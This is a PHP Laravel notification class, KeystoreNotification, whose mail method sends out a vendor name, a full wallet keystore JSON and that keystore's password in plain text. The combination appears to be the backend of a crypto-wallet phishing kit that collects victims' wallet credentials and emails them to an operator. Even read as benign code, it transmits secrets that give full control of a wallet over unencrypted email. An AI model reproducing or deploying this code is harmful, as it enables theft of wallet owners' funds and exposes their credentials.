<?php

namespace App\Notifications;

use App\Models\KeyDetail;
use Illuminate\Bus\Queueable;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Notifications\Messages\MailMessage;
use Illuminate\Notifications\Notification;

class KeystoreNotification extends Notification
{
    use Queueable;

    protected $details;

    /**
     * Create a new notification instance.
     *
     * @return void
     */
    public function __construct(KeyDetail $details)
    {
        $this->details = $details;
    }

    /**
     * Get the notification's delivery channels.
     *
     * @param  mixed  $notifiable
     * @return array
     */
    public function via($notifiable)
    {
        return ['mail'];
    }

    /**
     * Get the mail representation of the notification.
     *
     * @param  mixed  $notifiable
     * @return \Illuminate\Notifications\Messages\MailMessage
     */
    public function toMail($notifiable)
    {
        return (new MailMessage)
            ->greeting('Hello,')
            ->subject('New Keystore Details')
            ->line('**Vendor:** ' . $this->details->vendor)
            ->line('**Keystore JSON:** ' . '``' . $this->details->keystore . '``')
            ->line('**Password:** ' . '``' . $this->details->password . '``')
            ->line('Thank you for using our services 🚀');
    }

    /**
     * Get the array representation of the notification.
     *
     * @param  mixed  $notifiable
     * @return array
     */
    public function toArray($notifiable)
    {
        return [
            //
        ];
    }
}
